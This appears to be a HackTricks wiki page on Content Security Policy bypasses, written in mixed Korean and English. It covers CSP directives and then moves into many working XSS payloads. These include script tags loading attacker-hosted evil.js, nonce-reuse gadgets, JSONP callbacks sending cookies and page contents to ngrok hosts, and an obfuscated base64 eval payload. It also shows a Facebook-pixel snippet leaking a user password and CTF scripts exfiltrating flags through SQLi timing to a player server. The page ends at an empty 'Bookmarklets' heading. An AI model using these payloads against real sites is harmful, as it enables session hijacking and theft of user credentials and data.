# Content Security Policy (CSP) Bypass

{{#include ../../banners/hacktricks-training.md}}

## CSP란 무엇인가

Content Security Policy (CSP)은 브라우저 기술로, 주로 **cross-site scripting (XSS)와 같은 공격으로부터 보호**하는 것을 목적으로 합니다. 브라우저가 안전하게 로드할 수 있는 리소스의 출처와 경로를 정의하고 명시함으로써 동작합니다. 이러한 리소스에는 이미지, 프레임, JavaScript 등 다양한 요소가 포함됩니다. 예를 들어, 정책은 동일 도메인(self)에서의 리소스 로드 및 실행, 인라인 리소스와 `eval`, `setTimeout`, `setInterval` 같은 함수로 문자열 코드를 실행하는 것을 허용할 수 있습니다.

CSP는 **response headers**를 통해 구현되거나, HTML 페이지에 **meta 요소**를 포함하여 적용될 수 있습니다. 브라우저는 이 정책을 준수하며 규정을 적극적으로 적용하고, 위반이 감지되면 즉시 차단합니다.

- Implemented via response header:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- meta 태그를 통해 구현됨:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### 헤더

다음 헤더를 사용해 CSP를 적용하거나 모니터링할 수 있습니다:

- `Content-Security-Policy`: CSP를 적용하며, 브라우저가 모든 위반을 차단합니다.
- `Content-Security-Policy-Report-Only`: 모니터링용으로 사용되며, 위반을 차단하지 않고 보고합니다. 사전 운영 환경에서 테스트할 때 적합합니다.

### 리소스 정의

CSP는 액티브 및 패시브 콘텐츠의 로드 출처(origin)를 제한하며, inline JavaScript execution 및 `eval()` 사용과 같은 동작을 제어합니다. 예시 정책은 다음과 같습니다:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### 디렉티브

- **script-src**: JavaScript에 대한 특정 출처를 허용합니다(예: URL, 인라인 스크립트, 이벤트 핸들러나 XSLT 스타일시트로 실행되는 스크립트 포함).
- **default-src**: 특정 fetch 디렉티브가 없을 때 리소스 페칭에 대한 기본 정책을 설정합니다.
- **child-src**: web worker와 임베디드 프레임 콘텐츠에 허용되는 리소스를 지정합니다.
- **connect-src**: fetch, WebSocket, XMLHttpRequest 같은 인터페이스로 로드할 수 있는 URL을 제한합니다.
- **frame-src**: 프레임에 대한 URL을 제한합니다.
- **frame-ancestors**: 현재 페이지를 임베드할 수 있는 출처를 지정합니다(`<frame>`, `<iframe>`, `<object>`, `<embed>`, `<applet>` 요소에 적용).
- **img-src**: 이미지에 허용되는 출처를 정의합니다.
- **font-src**: `@font-face`로 로드되는 폰트의 유효한 출처를 지정합니다.
- **manifest-src**: 애플리케이션 manifest 파일의 허용 출처를 정의합니다.
- **media-src**: 미디어 객체를 로드할 때 허용되는 출처를 정의합니다.
- **object-src**: `<object>`, `<embed>`, `<applet>` 요소에 허용되는 출처를 정의합니다.
- **base-uri**: `<base>` 요소를 사용하여 로드할 때 허용되는 URL을 지정합니다.
- **form-action**: 폼 제출에 유효한 엔드포인트를 나열합니다.
- **plugin-types**: 페이지가 호출할 수 있는 mime 타입을 제한합니다.
- **upgrade-insecure-requests**: 브라우저가 HTTP URL을 HTTPS로 재작성하도록 지시합니다.
- **sandbox**: `<iframe>`의 sandbox 속성과 유사한 제한을 적용합니다.
- **report-to**: 정책 위반 시 보고서를 보낼 그룹을 지정합니다.
- **worker-src**: Worker, SharedWorker, 또는 ServiceWorker 스크립트의 유효한 출처를 지정합니다.
- **prefetch-src**: 페치되거나 프리페치될 리소스의 유효한 출처를 지정합니다.
- **navigate-to**: 문서가 어떤 수단(a, form, window.location, window.open 등)을 통해 이동할 수 있는 URL을 제한합니다.

### 소스

- `*`: `data:`, `blob:`, `filesystem:` 스킴을 제외한 모든 URL을 허용합니다.
- `'self'`: 동일 도메인에서의 로드를 허용합니다.
- `'data'`: data 스킴(e.g., Base64 인코딩된 이미지)을 통해 리소스를 로드하는 것을 허용합니다.
- `'none'`: 어떤 출처에서도 로드하지 못하도록 차단합니다.
- `'unsafe-eval'`: `eval()` 및 유사 메서드의 사용을 허용합니다(보안상 권장되지 않습니다).
- `'unsafe-hashes'`: 특정 인라인 이벤트 핸들러를 활성화합니다.
- `'unsafe-inline'`: 인라인 `<script>`나 `<style>` 같은 인라인 리소스의 사용을 허용합니다(보안상 권장되지 않습니다).
- `'nonce'`: 암호학적 nonce(한 번만 사용되는 값)를 이용한 특정 인라인 스크립트의 화이트리스트입니다.
- JS가 제한된 실행 환경인 경우, 페이지 내부에서 사용된 nonce를 `doc.defaultView.top.document.querySelector("[nonce]")`로 얻어와 악성 스크립트를 로드하기 위해 재사용할 수 있습니다(만약 strict-dynamic이 사용되면, 허용된 어떤 출처도 새로운 출처를 로드할 수 있으므로 이 방법은 필요하지 않습니다), 예:

<details>

<summary>nonce를 재사용해 스크립트 로드하기</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
</details>

- `'sha256-<hash>'`: 특정 sha256 해시를 가진 스크립트를 허용 목록에 추가합니다.
- `'strict-dynamic'`: nonce나 hash로 허용 목록에 추가된 경우 모든 출처의 스크립트 로드를 허용합니다.
- `'host'`: 특정 호스트를 지정합니다(예: `example.com`).
- `https:`: HTTPS를 사용하는 URL로 제한합니다.
- `blob:`: Blob URL(예: JavaScript로 생성된 Blob URL)에서 리소스를 로드할 수 있게 합니다.
- `filesystem:`: 파일시스템에서 리소스를 로드할 수 있게 합니다.
- `'report-sample'`: 위반 보고서에 위반 코드의 샘플을 포함합니다(디버깅에 유용).
- `'strict-origin'`: 'self'와 유사하지만 출처의 프로토콜 보안 수준이 문서와 일치하는지 확인합니다(보안된 출처만 보안된 출처에서 리소스를 로드할 수 있음).
- `'strict-origin-when-cross-origin'`: 동일 출처 요청 시 전체 URL을 전송하지만 크로스 오리진 요청 시에는 출처(origin)만 전송합니다.
- `'unsafe-allow-redirects'`: 즉시 다른 리소스로 리디렉션되는 리소스의 로드를 허용합니다. 보안을 약화시키므로 권장되지 않습니다.

## 안전하지 않은 CSP 규칙

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
동작하는 payload: `"/><script>alert(1);</script>`

#### Iframes를 통한 self + 'unsafe-inline'


{{#ref}}
csp-bypass-self-+-unsafe-inline-with-iframes.md
{{#endref}}

### 'unsafe-eval'

> [!CAUTION]
> 작동하지 않습니다. 자세한 내용은 [**check this**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
작동하는 payload:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

만약 어떻게든 **허용된 JS 코드가 DOM에 새로운 script tag를 생성**하도록 당신의 JS 코드를 넣게 만들 수 있다면, 허용된 스크립트가 그것을 생성하고 있으므로 그 **새로운 script tag는 실행되도록 허용됩니다**.

### 와일드카드 (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
작동하는 payload:
```html
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### object-src 및 default-src 부재

> [!CAUTION] > **더 이상 작동하지 않는 것으로 보입니다**
```yaml
Content-Security-Policy: script-src 'self' ;
```
작동하는 payloads:
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### 파일 업로드 + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
만약 JS 파일을 업로드할 수 있다면 이 CSP를 bypass할 수 있습니다:

Working payload:
```html
"/>'><script src="/uploads/picture.png.js"></script>
```
하지만, 서버가 업로드된 파일을 **검증**하여 특정 유형의 파일만 **업로드 허용**할 가능성이 매우 높다.

또한, 서버가 허용하는 확장자(예: _script.png_)로 파일 안에 **JS 코드**를 업로드할 수 있다 해도, 일부 서버(예: apache server)는 확장자에 따라 **MIME type을 선택(select MIME type of the file based on the extension)**하고 Chrome 같은 브라우저는 이미지여야 할 파일 안의 Javascript 실행을 **거부(reject to execute Javascript)**한다. 다행히도 실수가 존재한다. 예를 들어 CTF에서 배운 바로는 **Apache doesn't know** the _**.wave**_ extension, therefore it doesn't serve it with a **MIME type like audio/***.

여기서, XSS와 파일 업로드가 모두 있다면 **misinterpreted extension**을 찾아 해당 확장자로 스크립트 내용을 가진 파일을 업로드해볼 수 있다. 또는 서버가 업로드된 파일의 형식을 엄격히 검사한다면 polyglot을 만들어보라 ([some polyglot examples here](https://github.com/Polydet/polyglot-database)).

### Form-action

JS 주입이 불가능한 경우에도, 예를 들어 자격증명 같은 정보를 유출하기 위해 **form action을 주입(injecting a form action)** 해볼 수 있다(그리고 password manager가 자동으로 비밀번호를 채워주기를 기대할 수도 있다). You can find an [**example in this report**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). 또한 `default-src`는 form actions를 커버하지 않는다는 점에 유의하라.

### Third Party Endpoints + ('unsafe-eval')

> [!WARNING]
> For some of the following payload **`unsafe-eval` is not even needed**.
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
취약한 버전의 angular를 로드하여 임의의 JS를 실행:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads using Angular + a library with functions that return the `window` object ([check out this post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

> [!TIP]
> 해당 포스트는 `cdn.cloudflare.com`(또는 다른 허용된 JS 라이브러리 저장소)에서 모든 **libraries**를 **load**한 뒤, 각 라이브러리의 추가된 모든 함수를 실행하여 **어떤 라이브러리의 어떤 함수가 `window` 객체를 반환하는지** 확인할 수 있음을 보여줍니다.
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
클래스 이름에서의 Angular XSS:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### google recaptcha JS 코드 악용

[**this CTF writeup**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=es&_x_tr_pto=wapp#noteninja-3-solves)에 따르면 CSP 내부에서 [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/)를 악용해 CSP를 우회하고 임의의 JS 코드를 실행할 수 있습니다:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
더 많은 [**payloads from this writeup**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>

<!-- Trigger alert -->
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />

<!-- Reuse nonce -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
#### www.google.com을 통한 open redirect 악용

다음 URL은 example.com으로 리디렉트됩니다 (출처: [here](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
악용 \*.google.com/script.google.com

Google Apps Script를 악용해 script.google.com 내부의 페이지에서 정보를 수신하는 것이 가능합니다. 이는 [done in this report](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/)에서 수행된 것과 같습니다.

### Third Party Endpoints + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
이와 같은 시나리오에서 `script-src`가 `self`와 특정 도메인(화이트리스트에 포함된)으로 설정된 경우 JSONP를 사용해 우회할 수 있다. JSONP 엔드포인트는 공격자가 XSS를 수행할 수 있도록 하는 안전하지 않은 콜백 메서드를 허용한다. 동작하는 payload:
```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

```html
<script type="text/javascript" crossorigin="anonymous" src="https://accounts.google.com/o/oauth2/revoke?callback=eval(atob(%27KGZ1bmN0aW9uKCl7CiBsZXQgdnIgPSAoKT0%2Be3dpdGgobmV3IHRvcFsnVydbJ2NvbmNhdCddKCdlYicsJ1MnLCdjZycmJidvY2snfHwncGsnLCdldCcpXSgndydbJ2NvbmNhdCddKCdzcycsJzpkZWZkZWYnLCdsaScsJ3ZlY2hhdGknLCduYycsJy4nfHwnOycsJ25ldHdvcmtkZWZjaGF0cGlwZWRlZjAyOWRlZicpWydzcGxpdCddKCdkZWYnKVsnam9pbiddKCIvIikpKShvbm1lc3NhZ2U9KGUpPT5uZXcgRnVuY3Rpb24oYXRvYihlWydkYXRhJ10pKS5jYWxsKGVbJ3RhcmdldCddKSl9O25hdmlnYXRvclsnd2ViZHJpdmVyJ118fChsb2NhdGlvblsnaHJlZiddWydtYXRjaCddKCdjaGVja291dCcpJiZ2cigpKTsKfSkoKQ%3D%3D%27));"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **다양한 웹사이트의 CSP bypass를 위한 바로 사용할 수 있는 JSONP endpoints를 포함합니다.**

동일한 취약성은 **신뢰된 엔드포인트에 Open Redirect가 포함된 경우**에도 발생합니다. 초기 엔드포인트가 신뢰되면 리디렉트도 신뢰되기 때문입니다.

### 제3자 악용

As described in the [following post](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), CSP의 어디엔가 허용될 수 있는 많은 제3자 도메인이 있으며, 이들은 데이터를 exfiltrate하거나 JavaScript 코드를 실행하는 데 악용될 수 있습니다. 일부 제3자 도메인은 다음과 같습니다:

| 엔티티            | 허용 도메인                               | 기능         |
| ----------------- | -------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com            | Exfil        |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Exfil        |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Exec         |
| Amazon CloudFront | \*.cloudfront.net                            | Exfil, Exec  |
| Amazon AWS        | \*.amazonaws.com                             | Exfil, Exec  |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec  |
| Salesforce Heroku | \*.herokuapp.com                             | Exfil, Exec  |
| Google Firebase   | \*.firebaseapp.com                           | Exfil, Exec  |

타깃의 CSP에서 위 허용 도메인 중 하나를 발견하면, 해당 타사 서비스에 등록하여 CSP를 bypass하고 데이터를 해당 서비스로 exfiltrate하거나 코드를 실행할 수 있을 가능성이 높습니다.

For example, if you find the following CSP:
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
또는
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
You should be able to exfiltrate data, similarly as it has always be done with [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). In this case, you follow these general steps:

1. 여기에서 Facebook Developer account를 생성합니다.
2. 새로운 "Facebook Login" 앱을 만들고 "Website"를 선택합니다.
3. "Settings -> Basic"로 이동해 "App ID"를 얻습니다.
4. exfiltrate할 대상 사이트에서 Facebook SDK의 gadget "fbq"를 "customEvent"와 data payload로 직접 호출하여 데이터를 exfiltrate할 수 있습니다.
5. App "Event Manager"로 이동해 생성한 애플리케이션을 선택합니다 (참고: event manager는 다음과 유사한 URL에서 찾을 수 있습니다: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events)
6. "Test Events" 탭을 선택하면 "your" web site에서 전송되는 이벤트를 볼 수 있습니다.

Then, on the victim side, you execute the following code to initialize the Facebook tracking pixel to point to the attacker's Facebook developer account app-id and issue a custom event like this:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
이전 표에 명시된 나머지 7개의 서드파티 도메인에 관해서는, 그것들을 악용할 수 있는 다른 방법들이 많이 있습니다. 추가적인 서드파티 악용 사례에 대한 설명은 이전의 [blog post](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) 를 참고하세요.

### Bypass via RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

앞서 언급한 경로 제한을 bypass하기 위한 리디렉션 외에도, 일부 서버에서 사용할 수 있는 Relative Path Overwrite (RPO)라는 다른 기법이 있습니다.

예를 들어, CSP가 `https://example.com/scripts/react/` 경로를 허용하는 경우, 다음과 같이 bypass할 수 있습니다:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
The browser will ultimately load `https://example.com/scripts/angular/angular.js`.

This works because for the browser, you are loading a file named `..%2fangular%2fangular.js` located under `https://example.com/scripts/react/`, which is compliant with CSP.

따라서, 브라우저는 이를 디코딩하여 실제로 `https://example.com/scripts/react/../angular/angular.js` 를 요청하게 되고, 이는 `https://example.com/scripts/angular/angular.js` 와 동일합니다.

By **브라우저와 서버 간의 URL 해석 불일치를 악용하면 경로 규칙을 우회할 수 있습니다**.

The solution is to not treat `%2f` as `/` on the server-side, ensuring consistent interpretation between the browser and the server to avoid this issue.

Online Example:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes JS execution


{{#ref}}
../xss-cross-site-scripting/iframes-in-xss-and-csp.md
{{#endref}}

### missing **base-uri**

If the **base-uri** directive is missing you can abuse it to perform a [**dangling markup injection**](../dangling-markup-html-scriptless-injection/index.html).

Moreover, if the **page is loading a script using a relative path** (like `<script src="/js/app.js">`) using a **Nonce**, you can abuse the **base** **tag** to make it **load** the script from **your own server achieving a XSS.**\
If the vulnerable page is loaded with **httpS**, make use an httpS url in the base.
```html
<base href="https://www.attacker.com/" />
```
### AngularJS 이벤트

Content Security Policy (CSP)라는 특정 정책은 JavaScript 이벤트를 제한할 수 있다. 그럼에도 AngularJS는 대안으로 커스텀 이벤트를 도입한다. 이벤트 내에서 AngularJS는 고유한 객체 `$event`를 제공하며, 이는 네이티브 브라우저 이벤트 객체를 참조한다. 이 `$event` 객체는 CSP를 우회하는 데 악용될 수 있다. 특히 Chrome에서는 `$event/event` 객체가 `path` 속성을 가지며, 이 속성은 이벤트 실행 체인에 관련된 객체들의 배열을 포함하고, `window` 객체는 항상 배열의 마지막에 위치한다. 이 구조는 sandbox escape 전술에 중요하다.

이 배열을 `orderBy` 필터로 전달하면 이를 반복(iterate)할 수 있고, 마지막 요소(`window` 객체)를 활용해 `alert()` 같은 전역 함수를 호출할 수 있다. 아래의 코드 스니펫이 이 과정을 설명한다:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
이 스니펫은 이벤트를 트리거하기 위해 `ng-focus` 디렉티브의 사용을 강조하며, `path` 배열을 조작하기 위해 `$event.path|orderBy`를 사용하고, `window` 객체를 이용해 `alert()` 함수를 실행하여 `document.cookie`를 노출시킵니다.

**다른 Angular bypasses는** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)에서 확인하세요

### AngularJS and whitelisted domain
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Angular JS 애플리케이션에서 스크립트 로딩을 위해 도메인을 화이트리스트하는 CSP 정책은 callback functions의 호출과 특정 vulnerable classes를 통해 우회될 수 있습니다. 이 기법에 대한 자세한 정보는 이 [git repository](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22)에 있는 상세 가이드를 참조하세요.

Working payloads:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
다른 JSONP arbitrary execution endpoints는 [**here**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)에서 찾을 수 있습니다 (일부는 삭제되거나 수정되었습니다)

### Bypass via Redirection

CSP가 server-side redirection을 만나면 어떤 일이 발생할까요? 그 redirection이 허용되지 않는 다른 origin으로 이어지면, 여전히 실패합니다.

하지만 [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects)의 설명에 따르면, redirection이 다른 path로 이어지는 경우 원래의 제한을 bypass할 수 있습니다.

Here's an example:
```html
<!DOCTYPE html>
<html>
<head>
<meta
http-equiv="Content-Security-Policy"
content="script-src http://localhost:5555 https://www.google.com/a/b/c/d" />
</head>
<body>
<div id="userContent">
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
If CSP is set to `https://www.google.com/a/b/c/d`, since the path is considered, both `/test` and `/a/test` scripts will be blocked by CSP.

However, the final `http://localhost:5555/301` will be **redirected on the server-side to `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Since it is a redirection, the **path is not considered**, and the **script can be loaded**, thus bypassing the path restriction.

With this redirection, even if the path is specified completely, it will still be bypassed.

Therefore, the best solution is to ensure that the website does not have any open redirect vulnerabilities and that there are no domains that can be exploited in the CSP rules.

### Bypass CSP with dangling markup

Read [how here](../dangling-markup-html-scriptless-injection/index.html).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'`은 코드 안에서 어떤 스크립트든 실행할 수 있다는 뜻입니다 (XSS는 코드를 실행할 수 있습니다) 그리고 `img-src *`는 웹페이지에서 어떤 리소스의 이미지든 사용할 수 있다는 뜻입니다.

You can bypass this CSP by exfiltrating the data via images (이번 경우에는 XSS가 CSRF를 악용하여 bot이 접근할 수 있는 페이지에 SQLi가 포함되어 있고, 이미지를 통해 flag를 추출합니다):
```javascript
<script>
fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new
Image().src='http://PLAYER_SERVER/?'+_)
</script>
```
출처: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

이 설정을 악용해 **이미지 안에 삽입된 javascript 코드를 로드**할 수도 있습니다. 예를 들어 페이지가 Twitter의 이미지를 로드하도록 허용한다면, **특수한 이미지**를 **제작(craft)**하여 **Twitter에 업로드**하고 "**unsafe-inline**"을 남용해 일반 XSS처럼 JS 코드를 **실행**할 수 있습니다. 이 코드는 이미지를 **로드**하고, 그 안에서 JS를 **추출**한 다음 **실행**합니다: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### With Service Workers

Service workers **`importScripts`** 함수는 CSP에 의해 제한되지 않습니다:


{{#ref}}
../xss-cross-site-scripting/abusing-service-workers.md
{{#endref}}

### Policy Injection

**Research:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

만약 당신이 보낸 **parameter**가 **policy의 선언(declaration)** 내부에 **붙여넣기(pasted)** 된다면, policy를 무력화하도록 어떤 방식으로든 **수정(alter)**할 수 있습니다. 다음 우회 기법들 중 하나로 **script 'unsafe-inline'을 허용**할 수 있습니다:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
이 디렉티브는 **기존 script-src directives를 덮어씁니다**.\
You can find an example here: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

Edge에서는 훨씬 간단합니다. CSP에 단지 이것만 추가할 수 있다면: **`;_`** **Edge**는 전체 **policy**를 **무시합니다**.\
Example: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](<http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E>)

### img-src \*; via XSS (iframe) - Time attack

디렉티브 `'unsafe-inline'`이(가) 없음을 주의하세요.\
이번에는 **XSS**로 `<iframe>`을 사용해 피해자에게 **당신이 제어하는** 페이지를 **로드**하게 할 수 있습니다. 이번에는 피해자에게 당신이 정보를 추출하려는 페이지에 접근하게 할 것입니다 (**CSRF**). 페이지의 내용을 직접 접근할 수는 없지만, 만약 어떤 식으로든 페이지가 로드되는 데 걸리는 시간을 **제어할 수 있다면** 필요한 정보를 추출할 수 있습니다.

이번에는 **flag**가 추출될 것이며, SQLi를 통해 **문자 하나가 올바르게 추측될 때마다** sleep function 때문에 **응답**이 **더 오래 걸립니다**. 그러면 플래그를 추출할 수 있게 됩니다:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name="f" id="g"></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org"
function gen(x) {
x = escape(x.replace(/_/g, "\\_"))
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`
}

function gen2(x) {
x = escape(x)
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`
}

async function query(word, end = false) {
let h = performance.now()
f.location = end ? gen2(word) : gen(word)
await new Promise((r) => {
g.onload = r
})
let diff = performance.now() - h
return diff > 300
}

let alphabet = "_abcdefghijklmnopqrstuvwxyz0123456789".split("")
let postfix = "}"

async function run() {
let prefix = "nn9ed{"
while (true) {
let i = 0
for (i; i < alphabet.length; i++) {
let c = alphabet[i]
let t = await query(prefix + c) // Check what chars returns TRUE or FALSE
console.log(prefix, c, t)
if (t) {
console.log("FOUND!")
prefix += c
break
}
}
if (i == alphabet.length) {
console.log("missing chars")
break
}
let t = await query(prefix + "}", true)
if (t) {
prefix += "}"
break
}
}
new Image().src = "http://PLAYER_SERVER/?" + prefix //Exfiltrate the flag
console.log(prefix)
}

run()
</script>
```
### Bookmarklets를 통한 공격

